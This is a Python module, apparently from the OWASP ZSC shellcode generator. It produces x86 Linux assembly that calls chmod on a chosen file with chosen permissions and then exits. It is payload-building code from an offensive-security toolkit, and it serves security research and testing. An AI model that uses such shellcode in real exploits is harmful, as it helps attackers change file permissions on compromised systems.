#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
'''
from core import stack
def chmod(perm_num,file_add):
	return '''push   $0x0f
pop    %%eax
%s
%s
mov    %%esp,%%ebx
int    $0x80
mov    $0x01,%%al
mov    $0x01,%%bl
int    $0x80'''%(perm_num,file_add)
def run(file_to_perm,perm_num):
	return chmod(stack.generate(perm_num,'%ecx','int'),stack.generate(file_to_perm,'%ebx','string'))

	
